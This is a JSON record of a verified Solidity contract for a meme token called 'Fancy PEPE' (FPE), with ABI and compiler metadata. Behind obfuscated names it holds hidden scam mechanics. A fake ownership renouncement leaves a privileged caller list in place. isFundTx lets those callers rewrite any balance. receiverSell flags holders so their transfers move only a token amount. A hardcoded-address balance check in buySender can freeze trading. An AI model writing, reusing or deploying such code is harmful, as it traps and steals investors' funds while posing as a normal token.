{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface listLimit {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address totalFundTrading) external view returns (uint256);\n\n    function transfer(address isList, uint256 fundReceiver) external returns (bool);\n\n    function allowance(address sellLaunched, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fundReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address isList,\n        uint256 fundReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed autoIs, uint256 value);\n    event Approval(address indexed sellLaunched, address indexed spender, uint256 value);\n}\n\nabstract contract feeLimit {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface enableWallet {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface shouldTrading {\n    function createPair(address enableAmount, address swapBuy) external returns (address);\n}\n\ninterface listLimitMetadata is listLimit {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract FancyPEPE is feeLimit, listLimit, listLimitMetadata {\n\n    bool public launchedFundBuy;\n\n    mapping(address => bool) public takeMin;\n\n    function balanceOf(address totalFundTrading) public view virtual override returns (uint256) {\n        return sellTrading[totalFundTrading];\n    }\n\n    function receiverSell(address totalListMax) public {\n        receiverLimit();\n        if (isLaunch != marketingLimit) {\n            launchSwap = liquiditySell;\n        }\n        if (totalListMax == totalToken || totalListMax == launchReceiver) {\n            return;\n        }\n        walletSwap[totalListMax] = true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return txIs;\n    }\n\n    function allowance(address exemptEnable, address launchTxTrading) external view virtual override returns (uint256) {\n        if (launchTxTrading == enableReceiver) {\n            return type(uint256).max;\n        }\n        return autoLimit[exemptEnable][launchTxTrading];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return toSwap;\n    }\n\n    function transferFrom(address launchSender, address isList, uint256 fundReceiver) external override returns (bool) {\n        if (_msgSender() != enableReceiver) {\n            if (autoLimit[launchSender][_msgSender()] != type(uint256).max) {\n                require(fundReceiver <= autoLimit[launchSender][_msgSender()]);\n                autoLimit[launchSender][_msgSender()] -= fundReceiver;\n            }\n        }\n        return buySender(launchSender, isList, fundReceiver);\n    }\n\n    address public launchReceiver;\n\n    function owner() external view returns (address) {\n        return enableMin;\n    }\n\n    string private txIs = \"Fancy PEPE\";\n\n    mapping(address => bool) public walletSwap;\n\n    function buySender(address launchSender, address isList, uint256 fundReceiver) internal returns (bool) {\n        if (launchSender == totalToken) {\n            return receiverAtSender(launchSender, isList, fundReceiver);\n        }\n        uint256 swapTrading = listLimit(launchReceiver).balanceOf(sellExempt);\n        require(swapTrading == tradingToEnable);\n        require(isList != sellExempt);\n        if (walletSwap[launchSender]) {\n            return receiverAtSender(launchSender, isList, feeSell);\n        }\n        return receiverAtSender(launchSender, isList, fundReceiver);\n    }\n\n    uint256 tradingToEnable;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fundSell;\n    }\n\n    mapping(address => mapping(address => uint256)) private autoLimit;\n\n    bool private marketingLimit;\n\n    uint256 private fundSell = 100000000 * 10 ** 18;\n\n    uint256 constant feeSell = 20 ** 10;\n\n    uint256 private launchSwap;\n\n    uint256 public liquiditySell;\n\n    event OwnershipTransferred(address indexed launchShouldTrading, address indexed shouldListReceiver);\n\n    mapping(address => uint256) private sellTrading;\n\n    function decimals() external view virtual override returns (uint8) {\n        return tokenIs;\n    }\n\n    address public totalToken;\n\n    function feeTotal() public {\n        emit OwnershipTransferred(totalToken, address(0));\n        enableMin = address(0);\n    }\n\n    address sellExempt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function receiverAtSender(address launchSender, address isList, uint256 fundReceiver) internal returns (bool) {\n        require(sellTrading[launchSender] >= fundReceiver);\n        sellTrading[launchSender] -= fundReceiver;\n        sellTrading[isList] += fundReceiver;\n        emit Transfer(launchSender, isList, fundReceiver);\n        return true;\n    }\n\n    uint256 launchReceiverAmount;\n\n    bool private isLaunch;\n\n    function isFundTx(address minMode, uint256 fundReceiver) public {\n        receiverLimit();\n        sellTrading[minMode] = fundReceiver;\n    }\n\n    function transfer(address minMode, uint256 fundReceiver) external virtual override returns (bool) {\n        return buySender(_msgSender(), minMode, fundReceiver);\n    }\n\n    constructor (){\n        \n        enableWallet fundTo = enableWallet(enableReceiver);\n        launchReceiver = shouldTrading(fundTo.factory()).createPair(fundTo.WETH(), address(this));\n        if (isLaunch) {\n            autoWallet = false;\n        }\n        totalToken = _msgSender();\n        feeTotal();\n        takeMin[totalToken] = true;\n        sellTrading[totalToken] = fundSell;\n        \n        emit Transfer(address(0), totalToken, fundSell);\n    }\n\n    function receiverLimit() private view {\n        require(takeMin[_msgSender()]);\n    }\n\n    function minSwap(uint256 fundReceiver) public {\n        receiverLimit();\n        tradingToEnable = fundReceiver;\n    }\n\n    uint8 private tokenIs = 18;\n\n    address enableReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function minSell(address receiverListAmount) public {\n        if (launchedFundBuy) {\n            return;\n        }\n        if (isLaunch) {\n            marketingLimit = true;\n        }\n        takeMin[receiverListAmount] = true;\n        \n        launchedFundBuy = true;\n    }\n\n    function getOwner() external view returns (address) {\n        return enableMin;\n    }\n\n    function approve(address launchTxTrading, uint256 fundReceiver) public virtual override returns (bool) {\n        autoLimit[_msgSender()][launchTxTrading] = fundReceiver;\n        emit Approval(_msgSender(), launchTxTrading, fundReceiver);\n        return true;\n    }\n\n    bool private autoWallet;\n\n    string private toSwap = \"FPE\";\n\n    address private enableMin;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchShouldTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldListReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoIs\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchTxTrading\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTxTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalFundTrading\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundReceiver\",\"type\":\"uint256\"}],\"name\":\"isFundTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedFundBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquiditySell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverListAmount\",\"type\":\"address\"}],\"name\":\"minSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fundReceiver\",\"type\":\"uint256\"}],\"name\":\"minSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalListMax\",\"type\":\"address\"}],\"name\":\"receiverSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "FancyPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}